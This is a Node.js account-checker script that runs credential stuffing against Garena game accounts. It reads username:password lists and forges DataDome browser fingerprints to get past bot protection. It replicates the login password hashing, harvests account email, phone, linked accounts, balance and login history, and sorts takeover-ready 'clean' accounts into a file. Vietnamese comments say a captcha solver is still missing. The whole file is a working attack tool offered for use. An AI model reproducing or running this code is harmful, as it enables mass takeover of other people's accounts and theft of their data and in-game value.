const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const chalk = require('chalk'); // For colored output, equivalent to colorama
const querystring = require('querystring');
const logging = {
    INFO: 'INFO',
    ERROR: 'ERROR',
    WARNING: 'WARNING',
    log: function(level, message) {
        const timestamp = new Date().toISOString();
        console.log(`${timestamp} - ${level} - ${message}`);
    },
    info: function(message) {
        this.log(this.INFO, message);
    },
    error: function(message) {
        this.log(this.ERROR, message);
    },
    warning: function(message) {
        this.log(this.WARNING, message);
    },
    exception: function(message) {
        this.log(this.ERROR, message);
        console.trace();
    }
};
function encode(plaintext, key) {
    const plaintextBuffer = Buffer.from(plaintext, 'hex');
    const keyBuffer = Buffer.from(key, 'hex');
    
    const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null);
    cipher.setAutoPadding(false);
    
    let ciphertext = cipher.update(plaintextBuffer);
    ciphertext = Buffer.concat([ciphertext, cipher.final()]);
    
    return ciphertext.toString('hex').substring(0, 32);
}

function getPassMd5(password) {
    const decodedPassword = decodeURIComponent(password);
    return crypto.createHash('md5').update(decodedPassword).digest('hex');
}

function hashPassword(password, v1, v2) {
    const passmd5 = getPassMd5(password);
    const innerHash = crypto.createHash('sha256').update(passmd5 + v1).digest('hex');
    const outerHash = crypto.createHash('sha256').update(innerHash + v2).digest('hex');
    return encode(passmd5, outerHash);
}

function applyCookies(axiosInstance, cookieStr) {
    if (!cookieStr) return {};
    
    const cookies = {};
    const cookiesArray = cookieStr.split(';').map(cookie => cookie.trim());
    
    cookiesArray.forEach(cookie => {
        if (!cookie) return;
        const parts = cookie.split('=');
        if (parts.length >= 2) {
            const key = parts[0].trim();
            const value = parts.slice(1).join('=').trim();
            cookies[key] = value;
        }
    });
    
    axiosInstance.defaults.headers.Cookie = cookieStr;
    return cookies;
}

function setCookie(axiosInstance, name, value, domain = null) {
    const currentCookie = axiosInstance.defaults.headers.Cookie || '';
    let cookieArray = currentCookie.split(';').map(c => c.trim()).filter(c => c);
    cookieArray = cookieArray.filter(c => !c.startsWith(`${name}=`));
    cookieArray.push(`${name}=${value}`);
    axiosInstance.defaults.headers.Cookie = cookieArray.join('; ');
}

function generateCid() {
    const characters = 'abcdef0123456789~';
    let result = '';
    for (let i = 0; i < 100; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function generateBrowserFingerprint() {
    return {
        "ttst": String(Math.random() * 40 + 60),
        "hc": String(Math.floor(Math.random() * 7) + 2),
        "br_oh": String(Math.floor(Math.random() * 201) + 700),
        "br_ow": String(Math.floor(Math.random() * 301) + 1300),
        "ua": generateUserAgent(),
        "wbd": "false",
        "dp0": "true",
        "tagpu": String(Math.random() * 9 + 1),
        "wdif": "false",
        "wdifrm": "false",
        "npmtm": "false",
        "br_h": String(Math.floor(Math.random() * 201) + 600),
        "br_w": String(Math.floor(Math.random() * 201) + 200),
        "isf": "false",
        "nddc": String(Math.floor(Math.random() * 2)),
        "rs_h": String(Math.floor(Math.random() * 201) + 800),
        "rs_w": String(Math.floor(Math.random() * 301) + 1300),
        "rs_cd": "24",
        "phe": "false",
        "nm": "false",
        "jsf": "false",
        "lg": "en-US",
        "pr": "1.25",
        "ars_h": String(Math.floor(Math.random() * 101) + 800),
        "ars_w": String(Math.floor(Math.random() * 301) + 1300),
        "tz": "-480",
        "str_ss": "true",
        "str_ls": "true",
        "str_idb": "true",
        "str_odb": "false",
        "plgod": "false",
        "plg": "5",
        "plgne": "true",
        "plgre": "true",
        "plgof": "false",
        "plggt": "false",
        "pltod": "false",
        "hcovdr": "false",
        "hcovdr2": "false",
        "plovdr": "false",
        "plovdr2": "false",
        "ftsovdr": "false",
        "ftsovdr2": "false",
        "lb": "false",
        "eva": "33",
        "lo": "false",
        "ts_mtp": "0",
        "ts_tec": "false",
        "ts_tsa": "false",
        "vnd": "Google Inc.",
        "bid": "NA",
        "mmt": "application/pdf,text/pdf",
        "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": "false",
        "awe": "false",
        "geb": "false",
        "dat": "false",
        "med": "defined",
        "aco": "probably",
        "acots": "false",
        "acmp": "probably",
        "acmpts": "true",
        "acw": "probably",
        "acwts": "false",
        "acma": "maybe",
        "acmats": "false",
        "acaa": "probably",
        "acaats": "true",
        "ac3": "",
        "ac3ts": "false",
        "acf": "probably",
        "acfts": "false",
        "acmp4": "maybe",
        "acmp4ts": "false",
        "acmp3": "probably",
        "acmp3ts": "false",
        "acwm": "maybe",
        "acwmts": "false",
        "ocpt": "false",
        "vco": "",
        "vcots": "false",
        "vch": "probably",
        "vchts": "true",
        "vcw": "probably",
        "vcwts": "true",
        "vc3": "maybe",
        "vc3ts": "false",
        "vcmp": "",
        "vcmpts": "false",
        "vcq": "maybe",
        "vcqts": "false",
        "vc1": "probably",
        "vc1ts": "true",
        "dvm": String(Math.floor(Math.random() * 7) + 4),
        "sqt": "false",
        "so": "landscape-primary",
        "bda": "false",
        "wdw": "true",
        "prm": "true",
        "tzp": "NA",
        "cvs": "true",
        "usb": "true",
        "cap": "true",
        "tbf": "false",
        "lgs": "true",
        "tpd": "true",
    };
}

// API interaction functions
async function getDatadomeCookie(axiosInstance, cid, maxRetries = 5, baseDelay = 2) {
    const url = 'https://api-js.datadome.co/js/';
    const headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generateUserAgent(),
        'x-custom-header': Array(20).fill(0).map(() => 'abcdef0123456789'.charAt(Math.floor(Math.random() * 16))).join('')
    };

    const jsData = generateBrowserFingerprint();
    const payload = {
        'jsData': JSON.stringify(jsData),
        'eventCounters': '{"mousemove":0,"click":0,"scroll":4,"touchstart":0,"touchend":0,"touchmove":0,"keydown":0,"keyup":0}',
        'jsType': 'ch',
        'cid': cid,
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.36.0',
        'custom': Array(20).fill(0).map(() => 'abcdef0123456789'.charAt(Math.floor(Math.random() * 16))).join('')
    };

    const data = Object.entries(payload)
        .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
        .join('&');

    for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
            const response = await axiosInstance.post(url, data, { headers });
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const responseData = response.data;
            
            if (responseData.status === 200 && responseData.cookie) {
                const cookieString = responseData.cookie;
                const datadome = cookieString.split(';')[0].split('=')[1];
                logging.info(`DataDome cookie found: ${datadome}`);
                return datadome;
            } else {
                logging.error(`DataDome cookie not found in response, Status: ${responseData.status}`);
                logging.error(`Response content: ${JSON.stringify(responseData).substring(0, 200)}...`);
            }
        } catch (error) {
            logging.error(`Error getting DataDome cookie, Retrying (${attempt + 1}/${maxRetries}): ${error.message}`);
        }

        if (attempt < maxRetries - 1) {
            await new Promise(resolve => setTimeout(resolve, baseDelay * (2 ** attempt) * 1000));
        }
    }

    logging.error("Max retries reached, DataDome cookie could not be obtained.");
    return null;
}

async function prelogin(axiosInstance, account, cid, datadome_cookie, maxRetries = 3, baseDelay = 2) {
    const url = 'https://authgop.garena.com/api/prelogin';
    const params = {
        'app_id': 10017,
        'account': account,
        'format': 'json',
        'id': String(Date.now())
    };

    const headers = {
        'Host': 'authgop.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Windows"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'x-datadome-clientid': cid,
        'sec-ch-ua-mobile': '?0',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://authgop.garena.com/universal/oauth?client_id=10017&redirect_uri=https%3A%2F%2Fnapthe.vn%2Fapp%2F&response_type=token&platform=1&locale=vi-VN&theme=white',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8,vi;q=0.7',
        'Cookie': `datadome=${datadome_cookie}`
    };

    for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
            await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
            const response = await axiosInstance.get(url, { headers, params });
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const data = response.data;
            const cookies = response.headers['set-cookie'] || [];
            const newDatadome = cookies.find(cookie => cookie.startsWith('datadome='));
            const newDatadomeCookie = newDatadome ? newDatadome.split(';')[0].split('=')[1] : null;
            
            if (response.headers['x-dd-b'] || (typeof data === 'object' && "url" in data)) {
                logging.warning(`DataDome challenge detected for ${account}. Retrying prelogin.`);
                await new Promise(resolve => setTimeout(resolve, baseDelay * (2 ** attempt) * 1000));
                continue;
            }

            const v1Data = data.v1;
            const v2Data = data.v2;

            if (!v1Data || !v2Data) {
                logging.error(`Prelogin error for ${account}: Missing v1 or v2 data`);
                return [null, null, newDatadomeCookie];
            }

            logging.info(`Prelogin successful: ${account}`);
            return [v1Data, v2Data, newDatadomeCookie];
        } catch (error) {
            logging.error(`Error fetching prelogin data, Retrying (${attempt + 1}/${maxRetries}): ${error.message}`);
            if (error.response) {
                console.log(`Status: ${error.response.status}`);
                console.log(`Data: ${JSON.stringify(error.response.data || {})}`);
            }
        }

        if (attempt < maxRetries - 1) {
            await new Promise(resolve => setTimeout(resolve, baseDelay * (2 ** attempt) * 1000));
        }
    }

    logging.error(`Max retries reached, prelogin could not be completed for ${account}.`);
    return [null, null, null];
}

async function login(axiosInstance, account, password, v1, v2) {
    const hashedPassword = hashPassword(password, v1, v2);
    const url = 'https://authgop.garena.com/api/login';
    const params = {
        'app_id': '10017',
        'account': account,
        'password': hashedPassword,
        'redirect_uri': 'https://shop.garena.ph/app/100082',
        'format': 'json',
        'id': String(Date.now())
    };
    
    const headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://authgop.garena.com/universal/oauth',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
    };
    
    try {
        const response = await axiosInstance.get(url, { headers, params });
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const data = response.data;
        const cookies = response.headers['set-cookie'] || [];
        const ssoKeyCookie = cookies.find(cookie => cookie.startsWith('sso_key='));
        const ssoKey = ssoKeyCookie ? ssoKeyCookie.split(';')[0].split('=')[1] : null;
        
        if ('error' in data) {
            logging.error(`Login failed: ${data.error}`);
            return null;
        }
        
        logging.info(`Logged in: ${account}`);
        return ssoKey;
    } catch (error) {
        logging.error(`Login failed: ${error.message}`);
        return null;
    }
}

async function initaccount(axiosInstance, ssoKey) {
    const url = 'https://account.garena.com/api/account/init';
    const headers = {
        'accept': '*/*',
        'cookie': `sso_key=${ssoKey}`,
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    };
    
    try {
        const response = await axiosInstance.get(url, { headers });
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const data = response.data;
        const cookies = response.headers['set-cookie'] || [];
        const acSessionCookie = cookies.find(cookie => cookie.startsWith('ac_session='));
        const acSession = acSessionCookie ? acSessionCookie.split(';')[0].split('=')[1] : null;
        
        logging.info("Account initialized");
        return acSession;
    } catch (error) {
        logging.error(`Initialization failed: ${error.message}`);
        return null;
    }
}

function parseAccountDetails(data) {
    const userInfo = data.user_info || {};
    const binds = [];
    const detailedInfo = {
        'email_status': 'Not Verified',
        'fb_status': 'Not Linked',
        'phone_status': 'Not Binded',
        'shells': 0,
        'last_login': 'N/A',
        'sensitive_ops': []
    };

    if (userInfo.email) {
        binds.push('Email');
        detailedInfo.email_status = userInfo.email_v === 1 ? 'Verified' : 'Not Verified';
    }

    if (userInfo.mobile_no) {
        binds.push('Phone');
        detailedInfo.phone_status = 'Binded';
    }

    if (userInfo.fb_account !== null) {
        binds.push('Facebook');
        detailedInfo.fb_status = 'Linked';
    }

    detailedInfo.shells = userInfo.shell || 0;

    if (data.login_history && data.login_history.length > 0) {
        const lastLogin = data.login_history[0];
        detailedInfo.last_login = {
            'ip': lastLogin.ip || 'N/A',
            'timestamp': new Date(lastLogin.timestamp * 1000).toISOString().replace('T', ' ').substring(0, 19),
            'source': lastLogin.source || 'N/A',
            'country': lastLogin.country || 'N/A'
        };
    }

    if (data.sensitive_operation) {
        detailedInfo.sensitive_ops = data.sensitive_operation.map(op => ({
            'operation': op.operation || 'N/A',
            'ip': op.ip || 'N/A',
            'timestamp': new Date(op.timestamp * 1000).toISOString().replace('T', ' ').substring(0, 19),
            'country': op.country || 'N/A'
        }));
    }

    if (binds.length > 0) {
        if (binds.includes('Email') && detailedInfo.email_status === 'Not Verified') {
            return {
                'username': userInfo.username || 'N/A',
                'email': userInfo.email || 'N/A',
                'mobile': userInfo.mobile_no || 'N/A',
                'country': userInfo.acc_country || 'N/A',
                'binds': binds,
                'status': 'Clean',
                'detailed_info': detailedInfo
            };
        }
        return {
            'username': userInfo.username || 'N/A',
            'email': userInfo.email || 'N/A',
            'mobile': userInfo.mobile_no || 'N/A',
            'country': userInfo.acc_country || 'N/A',
            'binds': binds,
            'status': 'Binded',
            'detailed_info': detailedInfo
        };
    } else {
        return {
            'username': userInfo.username || 'N/A',
            'email': userInfo.email || 'N/A',
            'mobile': userInfo.mobile_no || 'N/A',
            'country': userInfo.acc_country || 'N/A',
            'binds': binds,
            'status': 'Clean',
            'detailed_info': detailedInfo
        };
    }
}

async function processAccount(account, password) {
    const axiosInstance = axios.create();
    try {
        const cid = generateCid();
        const datadome = await getDatadomeCookie(axiosInstance, cid);
        if (!datadome) {
            console.log(`[-] ${account}: DataDome cookie generation failed`);
            return `${account}: DataDome cookie generation failed`;
        }
        
        setCookie(axiosInstance, 'datadome', datadome);
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const [v1, v2, newDatadome] = await prelogin(axiosInstance, account, cid, datadome);
        if (!v1 || !v2) {
            console.log(`[-] ${account}: Prelogin failed`);
            return `${account}: Invalid (Prelogin failed)`;
        }

        if (newDatadome) {
            setCookie(axiosInstance, 'datadome', newDatadome);
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        const ssoKey = await login(axiosInstance, account, password, v1, v2);
        if (!ssoKey) {
            console.log(`[-] ${account}: Login failed`);
            return `${account}: Invalid (Login failed)`;
        }
        
        setCookie(axiosInstance, 'sso_key', ssoKey);
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const acSession = await initaccount(axiosInstance, ssoKey);
        if (!acSession) {
            console.log(`[-] ${account}: Account initialization failed`);
            return `${account}: Invalid (Initialization failed)`;
        }

        setCookie(axiosInstance, 'ac_session', acSession);
        await new Promise(resolve => setTimeout(resolve, 1000));

        const accountInitUrl = 'https://account.garena.com/api/account/init';
        const headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        };
        
        const response = await axiosInstance.get(accountInitUrl, { headers });
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const accountData = response.data;
    
        if ('error' in accountData) {
            if (accountData.error === 'error_auth') {
                console.log(`[-] ${account}: Authentication error`);
                return `${account}: Invalid (Authentication error)`;
            }
            console.log(`[-] ${account}: Error fetching details`);
            return `${account}: Error fetching details (${accountData.error})`;
        }
        
        const details = parseAccountDetails(accountData);
        
        console.log(chalk.green(`[+] Successfully processed ${account}`));
        
        console.log(chalk.cyan("\n--- Account Details ---"));
        console.log(`Username: ${details.username}`);
        console.log(`Email: ${details.email}`);
        console.log(`Country: ${details.country}`);
        
        console.log(chalk.yellow("\n--- Binding Status ---"));
        console.log(`Bind Status: ${details.status}`);
        console.log(`Email Status: ${details.detailed_info.email_status}`);
        console.log(`Phone Status: ${details.detailed_info.phone_status}`);
        console.log(`Facebook Status: ${details.detailed_info.fb_status}`);
        
        console.log(chalk.magenta("\n--- Additional Information ---"));
        console.log(`Garena Shells: ${details.detailed_info.shells}`);

        if (details.detailed_info.last_login !== 'N/A') {
            console.log("\nLast Login:");
            const lastLogin = details.detailed_info.last_login;
            console.log(`IP: ${lastLogin.ip}`);
            console.log(`Timestamp: ${lastLogin.timestamp}`);
            console.log(`Source: ${lastLogin.source}`);
            console.log(`Country: ${lastLogin.country}`);
        }
        
        if (details.detailed_info.sensitive_ops.length > 0) {
            console.log("\nSensitive Operations:");
            details.detailed_info.sensitive_ops.forEach(op => {
                console.log(`Operation: ${op.operation}`);
                console.log(`IP: ${op.ip}`);
                console.log(`Timestamp: ${op.timestamp}`);
                console.log(`Country: ${op.country}\n`);
            });
        }

        const result = {
            'account': account,
            'password': password,
            'status': 'Success',
            'username': details.username,
            'email': details.email,
            'phone': details.mobile,
            'country': details.country,
            'bind_status': details.status,
            'email_status': details.detailed_info.email_status,
            'phone_status': details.detailed_info.phone_status,
            'facebook_status': details.detailed_info.fb_status,
            'shells': details.detailed_info.shells,
            'last_login': details.detailed_info.last_login,
            'sensitive_ops': details.detailed_info.sensitive_ops,
            'is_clean': details.status === 'Clean' && details.detailed_info.email_status === 'Not Verified'
        };
        return result;

    } catch (error) {
        if (error.response) {
            console.log(`[-] Request Error for ${account}: ${error.message}`);
            console.log(`Status: ${error.response.status}`);
            if (error.response.data) {
                console.log(`Response: ${JSON.stringify(error.response.data)}`);
            }
            return `${account}: Request Error (${error.response.status})`;
        }
        
        console.log(`[-] Unexpected Error for ${account}: ${error.message}`);
        return `${account}: Unexpected Error`;
    }
}

async function readAccounts(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const accounts = data.split('\n')
            .map(line => line.trim())
            .filter(line => line)
            .map(line => line.split(':'));
        
        for (let index = 0; index < accounts.length; index++) {
            const accountInfo = accounts[index];
            if (accountInfo.length !== 2) {
                logging.warning(`Skipping invalid format: ${accountInfo.join(':')}`);
                continue;
            }
            const [account, password] = accountInfo;
            logging.info(`Processing ${account}... (${index + 1}/${accounts.length})`);
            
            try {
                const result = await processAccount(account, password);
                if (typeof result === 'object') {
                    if (result.is_clean) {
                        try {
                            const cleanContent = fs.existsSync('clean.txt') ? 
                                fs.readFileSync('clean.txt', 'utf8') : '';
                            if (!cleanContent.includes(`${account}:${password}`)) {
                                fs.appendFileSync('clean.txt', `${account}:${password}\n`);
                                console.log(chalk.green(`[+] ${account} saved to clean.txt`));
                            }
                        } catch (fsError) {
                            logging.error(`File operation error: ${fsError.message}`);
                        }
                    } else {
                        try {
                            const bindsContent = fs.existsSync('binds.txt') ? 
                                fs.readFileSync('binds.txt', 'utf8') : '';
                            if (!bindsContent.includes(`${account}:${password}:${result.bind_status}`)) {
                                fs.appendFileSync('binds.txt', `${account}:${password}:${result.bind_status}\n`);
                                console.log(chalk.yellow(`[!] ${account} saved to binds.txt`));
                            }
                        } catch (fsError) {
                            logging.error(`File operation error: ${fsError.message}`);
                        }
                    }
                } else {
                    try {
                        fs.appendFileSync('errors.txt', `${account}:${password}:${result}\n`);
                        logging.error(`${account}: Error - ${result}`);
                    } catch (fsError) {
                        logging.error(`File operation error: ${fsError.message}`);
                    }
                }
            } catch (e) {
                logging.error(`Error processing account ${account}: ${e.message}`);
                continue;
            }
            
            logging.info(`Waiting 10 seconds before next account...`);
            await new Promise(resolve => setTimeout(resolve, 10000));
        }
    } catch (e) {
        logging.error(`Error reading accounts: ${e.message}`);
        logging.error(`Stack trace: ${e.stack}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

readline.question('Enter the filename containing accounts: ', (filename) => {
    console.log(`Processing accounts from ${filename}...`);
    readAccounts(filename).then(() => {
        console.log("Processing complete!");
        readline.close();
    }).catch(error => {
        console.error(`Fatal error: ${error.message}`);
        readline.close();
    });
});
//tao file va nhet tk, mk theo format TK:MK
//code ch hoan chinh do thieu phan solve catpcha
